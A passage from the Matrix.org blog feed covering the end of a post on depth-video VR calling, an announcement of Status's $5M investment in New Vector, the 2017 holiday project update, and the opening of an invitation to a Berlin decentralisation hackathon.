href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;commit&#x2F;9c58465ada08018b1238fb8c5d784b5570f9246b&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;commit&#x2F;9c58465ada08018b1238fb8c5d784b5570f9246b&lt;&#x2F;a&gt;.  Finally, just needed a few lines to matrix-ios-sdk to set the constraint and send the depth as well as video... &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&#x2F;compare&#x2F;fa9a24a6914b207389bacdd9ad08d5386fd0644a...5947d634ae8d722133ecdbde94cccf60bb88f11d&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&#x2F;compare&#x2F;fa9a24a6914b207389bacdd9ad08d5386fd0644a...5947d634ae8d722133ecdbde94cccf60bb88f11d&lt;&#x2F;a&gt;, and adding playback of both channels to the vrdemo (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-vr-demo&#x2F;commit&#x2F;4059ab671d13bb4d4eb19dd2f534d9a387e47b81&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-vr-demo&#x2F;commit&#x2F;4059ab671d13bb4d4eb19dd2f534d9a387e47b81&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;commit&#x2F;f3f1524fcd46d2e772fd5cd022364018c8889364&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;commit&#x2F;f3f1524fcd46d2e772fd5cd022364018c8889364&lt;&#x2F;a&gt;) ...and it worked!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;dots.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-2985&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;dots-1024x967.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;967&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;However, the dot cloud obviously has some limitations - especially when you zoom in like this.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Step 7&lt;&#x2F;strong&gt;: Replace the dot cloud with a displacement-mapped mesh so that it&#x27;s solid.  So as a final tweak for the demo, Dave switched out the dot cloud for a simple A-Frame plane with 640x480 vertices, keeping the same vertex shader.  Ironically this is where we hit some nasty problems, as for some reason the video texture started being applied to the depth texture (albeit flickering a bit) - eventually we realised that the flickering was the vertex shader inexplicably flapping between using the depth and the video texture for the displacement map.  At this point we compared it between laptops, and it turns out that for some reason the integrated Intel graphics on Dave&#x27;s Macbook Pro was choking on the two video textures, whereas a AMD Radeon R9 M370X got it right.  It&#x27;s unclear if this was actually a GPU bug or an A-Frame or Three.js or WebGL or Chrome bug.  Eitherway, on switching laptop to one with discrete graphics it started working perfectly!  Finally, we tweaked the shader to try to reduce smearing, by discarding vertices where there are big discontinuities in depth (through looking at the partial derivatives of the depth texture).  This isn&#x27;t perfect yet but it&#x27;s better than nothing.  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-vr-demo&#x2F;compare&#x2F;bbd460e81ff1336cd63468e707d858d47261ea42...06abe34957732ba8c728b99f198d987fe48d0420&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-vr-demo&#x2F;compare&#x2F;bbd460e81ff1336cd63468e707d858d47261ea42...06abe34957732ba8c728b99f198d987fe48d0420&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;And here&#x27;s the end result! (complete with trancey soundtrack as the audio we recorded at FOSDEM was unusable)&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;XvdZ2orVnrk&quot; frameBorder=&quot;0&quot; allowFullScreen=&quot;allowfullscreen&quot;&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;&lt;strong&gt;Conclusion:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Hopefully this gives a bit of a taste of what proper 3D video calling could be like in VR, and how (relatively) easy it was at the Matrix level to add it in.  If anyone wants to follow along at home, the various hacky branches are:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Playback:
&lt;ul&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-vr-demo&#x2F;tree&#x2F;dbkr&#x2F;depthhack_plane&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-vr-demo&#x2F;tree&#x2F;dbkr&#x2F;depthhack_plane&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;tree&#x2F;matthew&#x2F;depth&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;tree&#x2F;matthew&#x2F;depth&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
 	&lt;li&gt;Capture:
&lt;ul&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;tree&#x2F;matthew&#x2F;depth&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;tree&#x2F;matthew&#x2F;depth&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&#x2F;tree&#x2F;matthew&#x2F;depth&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&#x2F;tree&#x2F;matthew&#x2F;depth&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
If you&#x27;d like to get involved with hacking on Matrix in VR, please come hang out at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#vr:matrix.org&quot;&gt;#vr:matrix.org&lt;&#x2F;a&gt;.
&lt;p&gt;Also, New Vector (where most of the core team work) is also hiring for VoIP&#x2F;VR specialists right now, so if you&#x27;d like to work on this sort of thing fulltime, please contact us at &lt;a href=&quot;mailto:jobs@matrix.org&quot;&gt;jobs@matrix.org&lt;&#x2F;a&gt; asap!&lt;&#x2F;p&gt;
&lt;p&gt;Matthew&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Update:&lt;&#x2F;strong&gt; Slides from the FOSDEM talk (adapted from this blog post by Amandine) are available at &lt;a href=&quot;&#x2F;~matthew&#x2F;2018-02-04%20FOSDEM%20-%20VR.pdf&quot;&gt;https:&#x2F;&#x2F;matrix.org&#x2F;~matthew&#x2F;2018-02-04%20FOSDEM%20-%20VR.pdf&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Update 2: &lt;&#x2F;strong&gt;The full FOSDEM talk recording is now up already at the RTC dev room at &lt;a href=&quot;https:&#x2F;&#x2F;video.fosdem.org&#x2F;2018&#x2F;H.1309&#x2F;&quot;&gt;https:&#x2F;&#x2F;video.fosdem.org&#x2F;2018&#x2F;H.1309&#x2F;&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Status partners up with New Vector, fueling decentralised comms and the Matrix ecosystem!</title>
        <published>2018-01-29T00:00:00+00:00</published>
        <updated>2018-01-29T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2018/01/29/status-partners-up-with-new-vector-fueling-decentralised-comms-and-the-matrix-ecosystem/" type="text/html"/>
        <id>https://matrix.org/blog/2018/01/29/status-partners-up-with-new-vector-fueling-decentralised-comms-and-the-matrix-ecosystem/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;re delighted to announce that our friends at &lt;a href=&quot;https:&#x2F;&#x2F;status.im&quot;&gt;Status&lt;&#x2F;a&gt; have made a major strategic investment ($5M) in New Vector: the company which currently employs most of the Matrix.org core team.  This means that we now have the financial backing to let us focus entirely on improving the Matrix ecosystem and getting the protocol out of beta… and beyond!!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;status.im&quot;&gt;&lt;img class=&quot;size-medium wp-image-2941&quot; style=&quot;position: relative; right: 25px;&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;01&#x2F;LOGO_status_v5_1020x290-300x85.png&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;85&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&quot;&gt;&lt;img class=&quot;size-medium wp-image-2944&quot; style=&quot;position: relative; left: 25px; top: 7px;&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;01&#x2F;matrix-logo-1-300x128.png&quot; alt=&quot;&quot; width=&quot;225&quot; height=&quot;96&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;First up - massive, massive thanks to everyone who has supported us over the last 6 months since our &lt;a href=&quot;&#x2F;blog&#x2F;2017&#x2F;07&#x2F;07&#x2F;a-call-to-arms-supporting-matrix&#x2F;&quot;&gt;funding situation changed&lt;&#x2F;a&gt;: as of the end of 2017 we had enough Patreon &#x2F; Liberapay &#x2F; IBAN &#x2F; BTC &#x2F; ETH donations and sponsorship (for Matrix.org) and enough paid consulting work (for New Vector) that we&#x27;ve been able to keep almost the whole core team working on Matrix as their day job.  Simply: the core Matrix team could not have continued in its current form without the support of the community - so we will be forever indebted to everyone who has supported us: especially all our donating supporters on Patreon&#x2F;Liberapay&#x2F;etc, our customers at New Vector, and our big $ sponsors, including &lt;a href=&quot;https:&#x2F;&#x2F;www.upcloud.com&#x2F;&quot;&gt;UpCloud.com&lt;&#x2F;a&gt; (who provide &lt;em&gt;incredible&lt;&#x2F;em&gt; hosting for Matrix.org), &lt;a href=&quot;https:&#x2F;&#x2F;www.privateinternetaccess.com&#x2F;&quot;&gt;PrivateInternetAccess.com&lt;&#x2F;a&gt;, &lt;a href=&quot;http:&#x2F;&#x2F;inblockchain.com&#x2F;&quot;&gt;INBlockchain.com&lt;&#x2F;a&gt;, &lt;a href=&quot;http:&#x2F;&#x2F;omg.omise.co&quot;&gt;OmiseGO&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;tendermint.com&quot;&gt;Tendermint&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The investment from &lt;a href=&quot;https:&#x2F;&#x2F;status.im&quot;&gt;Status&lt;&#x2F;a&gt; that we&#x27;re announcing today is a massive step change as it gives us the resources to grow the team and to focus fully on Matrix&#x27;s key problem areas without distractions (whilst still supporting paid New Vector work). Please note that donations are still &lt;b&gt;very&lt;&#x2F;b&gt; appreciated however: we are in the process of setting up the Matrix.org Foundation (at last!) as the non-profit target for all future donations, such that Matrix itself has a financial means to support pure Matrix work independently of any other companies (including New Vector).&lt;&#x2F;p&gt;
&lt;p&gt;Many folks will be familiar with Status already as one of the leading projects in the &lt;a href=&quot;https:&#x2F;&#x2F;ethereum.org&#x2F;&quot;&gt;Ethereum&lt;&#x2F;a&gt; ecosystem: building a beautiful usability-focused browser for decentralised apps (DApps) which run on the Ethereum Virtual Machine - as well as providing cryptocurrency payments and chat functionality (via the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;wiki&#x2F;wiki&#x2F;Whisper&quot;&gt;Whisper&lt;&#x2F;a&gt; protocol).  It effectively lets users access Ethereum as a usable meaningful operating system - a bit like how Riot attempts to be a flagship ‘browser&#x27; for the Matrix ecosystem.  The reason Status is investing in Matrix is primarily to accelerate decentralisation technology and open protocols in general - and also because there are some pretty obvious advantages to the collaboration, potentially including:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Bridging between Matrix and Whisper (Ethereum&#x27;s own real-time communication protocol) - exposing all of the Matrix ecosystem into Ethereum and vice versa&lt;&#x2F;li&gt;
&lt;li&gt;Bundling up Status DApps as Matrix Widgets&lt;&#x2F;li&gt;
&lt;li&gt;Exposing Matrix Widgets into Status&lt;&#x2F;li&gt;
&lt;li&gt;Supporting Olm&#x2F;Megolm such that it could be used for E2E encryption in Status&lt;&#x2F;li&gt;
&lt;li&gt;Collaboration on the decentralised reputation systems needed to combat abuse in both Matrix &amp;amp; Ethereum&lt;&#x2F;li&gt;
&lt;li&gt;Utilize the &lt;a href=&quot;https:&#x2F;&#x2F;status.im&#x2F;whitepaper.pdf&quot;&gt;Status Network token&lt;&#x2F;a&gt; within Riot.im by enabling crypto assets.&lt;&#x2F;li&gt;
&lt;li&gt;...and more!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We&#x27;ve spent a lot of time working with Status over the last few months whilst arranging this partnership, and we&#x27;ve been really impressed by Jarrad and Carl and the team (they even have their own golang &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;status-im&#x2F;doubleratchet&quot;&gt;Double Ratchet Implementation&lt;&#x2F;a&gt;!).  It&#x27;s fair to say that Status are very much aligned with Matrix&#x27;s vision, and the projects and can help each other a lot.&lt;&#x2F;p&gt;
&lt;p&gt;It&#x27;s also worth noting that Status and Matrix are really quite complementary: Whisper (as used by Status) is entirely p2p and focuses on protecting metadata and is tightly coupled to Ethereum, whereas Matrix is standalone and more feature rich but currently lacks metadata protection.  We both have fledgling app ecosystems; Matrix through Widgets and Status through Ethereum DApps. That said, Matrix and Status are going to continue on their own paths, and Matrix will of course remain controlled by Matrix.org - but we are looking forward to learning more about each other&#x27;s tech and driving decentralisation forward in general!&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, on the core Matrix side, the investment lets us focus immediately on the following priorities:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;b&gt;Improving Riot&#x27;s usability. As of today we are urgently hiring for a Lead Designer to join the team fulltime to revamp and address Riot&#x27;s usability issues, as this is one of the single biggest things getting in the way of Matrix uptake today.  Hit up &lt;a href=&quot;mailto:jobs@riot.im&quot;&gt;jobs@riot.im&lt;&#x2F;a&gt; if you&#x27;re interested!&lt;&#x2F;b&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;b&gt;At the same time, we&#x27;re excited to ramp up our investment in Riot&#x27;s performance and overall polish (as well as achieving feature parity with Slack&#x2F;Discord and friends) - that means we&#x27;re looking for React, Android &amp;amp; iOS folks to join the core team full-time asap to take the apps to the next level.  Again, &lt;a href=&quot;mailto:jobs@riot.im&quot;&gt;jobs@riot.im&lt;&#x2F;a&gt; if this sounds like you!&lt;&#x2F;b&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;b&gt;Getting End-to-end Encryption out of beta.&lt;&#x2F;b&gt; We know what we need to do to push E2E out of beta (incremental key backup; cross-signing devices; improved device verification) - Status&#x27; investment means we can build the team to get it done! Decentralised end-to-end encryption is not for the faint-hearted, but if you&#x27;re up for the challenge please get in touch at &lt;a href=&quot;mailto:jobs@matrix.org&quot;&gt;jobs@matrix.org&lt;&#x2F;a&gt;.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;b&gt;Finishing Dendrite.&lt;&#x2F;b&gt; Dendrite (our next-gen golang homeserver implementation) is a hugely ambitious project and right now the only folks working on it are Rich and Erik… who also happen to be supporting Synapse too.  The good news is that the community has been helping considerably with Dendrite, but it would be even better if we had more people supported to work on it full time.  If you love Go, and you love massively scalable decentralised systems, please hit up &lt;a href=&quot;mailto:jobs@matrix.org&quot;&gt;jobs@matrix.org&lt;&#x2F;a&gt;!
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;b&gt;Supporting Synapse.&lt;&#x2F;b&gt;There is massive scope for performance improvements to Synapse, and there are thousands of deployments out there today, so we really want to improve support for Synapse.  If you love Python and Twisted, and interesting performance&#x2F;profiling and efficiency work, please hit up &lt;a href=&quot;mailto:jobs@matrix.org&quot;&gt;jobs@matrix.org&lt;&#x2F;a&gt; too!
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;b&gt;Maintaining the Spec.&lt;&#x2F;b&gt; If Matrix is anything it is the spec, and maintenance of the spec is key to the project&#x27;s success. In 2018 we intend to invest heavily in its maintenance and address outstanding API proposals, documenting APIs, not to mention updating the general technical documentation (guides, FAQ etc) on Matrix.org in general.  If you are a developer who loves spec work, we need you over at &lt;a href=&quot;mailto:jobs@matrix.org&quot;&gt;jobs@matrix.org&lt;&#x2F;a&gt; immediately! :)
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Beyond these immediate priorities, we have a long feature roadmap lined up too (highest priority first): Reactions, Message Editing, improved Widgets (e.g. Sticker Packs), Threading, Decentralised Accounts, Decentralised Identity, Decentralised Reputation, Peer-to-peer Matrix and more.  However, right now our focus has to be on improving the quality and stability of what we have today and getting it out of beta before we open yet more battlefronts.  In other words: we&#x27;re not adding more features (modulo emergencies) until the current features are polished!
&lt;p&gt;So: exciting times ahead!  Never before has Matrix had the resources to fully realise its potential, and we&#x27;d like to say enormous thanks to Carl, Jarrad, Yessin and Nabil at Status for their patience and support while sorting out the investment.  We&#x27;d also like to say thanks to everyone else who offered us investment: in the end we had several viable offers on the table - and we owe sincere thanks to those who invested the time and faith to make an offer which we&#x27;ve ended up turning down.&lt;&#x2F;p&gt;
&lt;p&gt;For now, however, it&#x27;s back to work: making Riot slicker than Slack; making Synapse go faster and use less RAM; making Dendrite federate; making E2E encryption transparent and indestructible; making sure that it&#x27;s possible to implement Matrix purely by referring to the Spec.&lt;&#x2F;p&gt;
&lt;p&gt;2018 is going to be an interesting year indeed :)  Thank you all for supporting Matrix - and thanks, once again, to Status for helping to take us to the next level.&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the whole team.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;Update 1: VentureBeat is covering the news over at &lt;a href=&quot;https:&#x2F;&#x2F;venturebeat.com&#x2F;2018&#x2F;01&#x2F;29&#x2F;status-invests-5-million-in-matrix-to-create-a-blockchain-messaging-superpower&#x2F;&quot;&gt;https:&#x2F;&#x2F;venturebeat.com&#x2F;2018&#x2F;01&#x2F;29&#x2F;status-invests-5-million-in-matrix-to-create-a-blockchain-messaging-superpower&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;Update 2: IBTimes is also covering it at &lt;a href=&quot;http:&#x2F;&#x2F;www.ibtimes.co.uk&#x2F;matrix-status-ico-gains-support-non-blockchain-decentralisation-technology-1656183&quot;&gt;http:&#x2F;&#x2F;www.ibtimes.co.uk&#x2F;matrix-status-ico-gains-support-non-blockchain-decentralisation-technology-1656183&lt;&#x2F;a&gt;!&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;...and you can see Status&#x27;s side of the story over at &lt;a href=&quot;https:&#x2F;&#x2F;blog.status.im&#x2F;status-invests-5m-in-riot-im-4e3026a8bd50&quot;&gt;https:&#x2F;&#x2F;blog.status.im&#x2F;status-invests-5m-in-riot-im-4e3026a8bd50&lt;&#x2F;a&gt;!&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The Matrix Holiday Mini-Special (2017 edition)</title>
        <published>2017-12-25T00:00:00+00:00</published>
        <updated>2017-12-25T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/12/25/the-matrix-holiday-mini-special-2017-edition/" type="text/html"/>
        <id>https://matrix.org/blog/2017/12/25/the-matrix-holiday-mini-special-2017-edition/</id>
        
        <content type="html">&lt;p&gt;Hi folks,&lt;&#x2F;p&gt;
&lt;p&gt;Since we began Matrix it&#x27;s been a sort of tradition to do a huge update on Christmas Eve to reflect on the past year and tease the future - you can check out the &lt;a href=&quot;&#x2F;blog&#x2F;2016&#x2F;12&#x2F;26&#x2F;the-matrix-holiday-special-2016-edition&#x2F;&quot;&gt;2016 edition&lt;&#x2F;a&gt; or the &lt;a href=&quot;&#x2F;blog&#x2F;2015&#x2F;12&#x2F;25&#x2F;the-matrix-holiday-special&#x2F;&quot;&gt;2015 edition&lt;&#x2F;a&gt; and a sort of &lt;a href=&quot;&#x2F;blog&#x2F;2015&#x2F;01&#x2F;07&#x2F;synapse-0-6-1-released-and-other-news&#x2F;&quot;&gt;proto-update for 2014&lt;&#x2F;a&gt; too if you&#x27;re feeling nostalgic.  This year I&#x27;m going to try to keep it short though, as I&#x27;m hoping to write a Very Big Update related to long-term-funding progress in the relatively near future.&lt;&#x2F;p&gt;
&lt;p&gt;2017 has been a weird year for us: progress in the core team has been relatively badly impacted by the mission to secure long-term funding, with myself (Matthew) &amp;amp; Amandine spending the vast majority of our time handling the meta-problem of keeping the core team secure rather than actually working on the project itself.  Meanwhile we&#x27;ve lost a few of the original team during the disruption, which has particularly impacted Spec, E2E and Dendrite progress (such are the risks of running a very lean team in the first place!).  However, against the odds, we have (hopefully) prevailed - and this is almost &lt;strong&gt;entirely&lt;&#x2F;strong&gt; due to the massive support we&#x27;ve seen through donations via &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&quot;&gt;Liberapay&lt;&#x2F;a&gt;, Ethereum, Bitcoin and &lt;a href=&quot;https:&#x2F;&#x2F;paypal.me&#x2F;matrixdotorg&quot;&gt;PayPal&lt;&#x2F;a&gt;, and some much-appreciated paid consulting work.&lt;&#x2F;p&gt;
&lt;p&gt;Simply put, without the donation support we would have not been able to pay the core team over the last 3 months, and we would not be able to pay for the legal costs of setting up the team as an independent company, and we would be completely screwed for securing large-scale long-term funding if we couldn&#x27;t point to the community&#x27;s support as evidence that Matrix is worthy of funding.  So: we sincerely owe our thanks to those who heeded the &lt;a href=&quot;&#x2F;blog&#x2F;2017&#x2F;07&#x2F;07&#x2F;a-call-to-arms-supporting-matrix&#x2F;&quot;&gt;call to arms&lt;&#x2F;a&gt; and are supporting us.  We&#x27;ve also been pretty lucky in benefiting from the skyrocketing value of Ethereum and Bitcoin donations.  And even if&#x2F;when long-term funding is secured for New Vector (the company we formed in July to hire the core team), donations will continue to be vital to support the Matrix.org Foundation itself as an independent non-profit entity - as it&#x27;s obviously not in Matrix.org&#x27;s interests to be entirely financially dependent on New Vector.  Hopefully this whole episode will end up being a bit like a &lt;a href=&quot;http:&#x2F;&#x2F;www.startrek.com&#x2F;article&#x2F;john-trimbles-contribution-to-saving-star-trek&quot;&gt;Save Star Trek&lt;&#x2F;a&gt; scenario - where something fun and amazing almost gets almost wiped out when it&#x27;s only a few years old due to corporate factors... only for the community to band together to save it, and then for it to go from strength to strength for the next 50 years or more! :D&lt;&#x2F;p&gt;
&lt;p&gt;That said, we&#x27;ve made some major progress this year anyway: the addition of Widgets to Matrix; the addition of Communities (aka Groups) and Flair; major improvements to E2E encryption (even though it&#x27;s not out of beta yet); lots of progress on Dendrite (the minimum-viable phase 1 is now about 75% complete); switching everything over to Jitsi for group video conferencing; rewriting onboarding for Riot&#x2F;Web; Antiscam&#x2F;spam support for cryptocommunities; the whole VR proof-of-concept of Matrix+WebVR+WebRTC video and voip calling; Version 0.3 of the Matrix spec; and a whole lot more which I&#x27;m probably forgetting right now.  And meanwhile the community has been more active than ever, with major new clients like &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;mujx&#x2F;nheko&quot;&gt;Nheko&lt;&#x2F;a&gt; hitting the scene with a large and loyal community of open source contributors (over the last few weeks I&#x27;ve literally seen more nheko PRs fly past than Riot ones!) - and we&#x27;ve also been &lt;em&gt;incredibly&lt;&#x2F;em&gt; glad of community contributions towards Dendrite.  Dendrite is already way ahead of Synapse in terms of % community contributed code - we have hope that it will end up being a model FOSS project :)&lt;&#x2F;p&gt;
&lt;p&gt;So what lies ahead?  It&#x27;s hard to predict the level of progress we&#x27;re going to make in the core team, as it really depends on long-term funding.  Whatever happens, one of our top priorities is to improve our governance so that everyone can better contribute in places that have historically been more blocked on the core team (i.e. the spec; synapse)... whilst still maintaining coherency across the project.  Ideally we&#x27;ll end up with more folks pushing Matrix forwards from both the wider world and the core team however, and right now the main priorities are:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Phase 2 of Communities: letting users filter their current view of Matrix to rooms associated with a given subset of communities (if desired), for Slack&#x2F;Discord-style semantics&lt;&#x2F;li&gt;
 	&lt;li&gt;Fixing the remaining end-to-end encryption failures (although the majority of them have now been solved)&lt;&#x2F;li&gt;
 	&lt;li&gt;Finalising proper UI&#x2F;UX for end-to-end encryption (at last), including the option to transparently back up your room keys if desired.&lt;&#x2F;li&gt;
 	&lt;li&gt;Dendrite Phase 1&lt;&#x2F;li&gt;
 	&lt;li&gt;Performance in Riot (on all platforms)&lt;&#x2F;li&gt;
 	&lt;li&gt;Editable messages&lt;&#x2F;li&gt;
 	&lt;li&gt;Reactions&lt;&#x2F;li&gt;
 	&lt;li&gt;Making widgets much more useful&lt;&#x2F;li&gt;
 	&lt;li&gt;Paid integrations and hosting options to help avoid further funding nightmares.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Looking at the bigger picture, what we&#x27;d really love for 2018 would be to finally get to a 1.0 release of the Matrix Spec (i.e. catching up on our massive backlog of merging unstable spec drafts &amp; proposals into the spec) - and for Dendrite to start to replace Synapse as the reference home server from Matrix.org and become really ubiquitous, and for E2E encryption be turned on by default in private rooms.  Beyond the above list, we don&#x27;t really have any other features urgently planned (threading, for instance, is on hold until we have the rest of the above sorted) - but we believe that if we stabilise everything we have today (plus that list), then there is no reason for Matrix to not fulfil its full potential as a true global open decentralised communications standard.  And then it&#x27;s on to threading, P2P matrix, decentralised reputation and all that good stuff!
&lt;p&gt;It&#x27;s going to be a crazy year ahead, either way: so thank you, once again, for supporting Matrix - whether that&#x27;s financially, or by contributing code, or running a server, or just using the protocol as a user.  We literally wouldn&#x27;t be here without you!! :)&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the whole core team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Goto::Hack: Ver, Berlin, Jan 2-9: A week-long session on internet decentralization!</title>
        <published>2017-12-08T00:00:00+00:00</published>
        <updated>2017-12-08T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/12/08/gotohack-ver-berlin-jan-2-9-a-week-long-session-on-internet-decentralization/" type="text/html"/>
        <id>https://matrix.org/blog/2017/12/08/gotohack-ver-berlin-jan-2-9-a-week-long-session-on-internet-decentralization/</id>
        
        <content type="html">&lt;p style=&quot;text-align: left;&quot;&gt;&lt;em&gt;We&#x27;d like to share a guest post from Dmitriy Volkov (who&#x27;s been using Matrix almost since day 1!) - announcing the Goto::Hack event at the Tor Onionspace in Berlin in January.  The Onionspace will be on fire as folks attack the New Year by tackling the critical problem of internet decentralisation. A week long brainstorm and hack feels like the right way to go after the Christmas break! GNUnet, Tor, Matrix, pick your topic, or mix them all, and join the gang!  Hopefully we&#x27;ll have someone there from the Matrix core team too (although it depends on funding and timings).&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p style=&quot;text-align: left;&quot;&gt;&lt;em&gt;-- Amandine&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
We&#x27;d like to invite you to discuss and hack all things decentralized internet: from conceptual issues like identity and foundational tech like network stack to most practical questions, e.g. &quot;What do I advise people at Cryptoparty in lieu of WhatsApp?&quot; or &quot;How do I make a GNUnet app?&quot;.
&lt;p&gt;Broadly, we&#x27;ll do networks, distributed systems, infosec and telecom - with GNUnet &#x2F; secushare and Matrix developers, find out more &lt;a href=&quot;https:&#x2F;&#x2F;gateway.ipfs.io&#x2F;ipns&#x2F;QmSgwwdejjsizQnKffKo6e84vfvBWCH5tnGpAwLPJVvhby&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;text-decoration: underline;&quot;&gt;Time&lt;&#x2F;span&gt;
: 02-09 Jan 2018
&lt;span style=&quot;text-decoration: underline;&quot;&gt;Space&lt;&#x2F;span&gt;
: Onionspace, Gottschedstraße 4, Aufgang 4, 13357 Berlin&lt;&#x2F;p&gt;
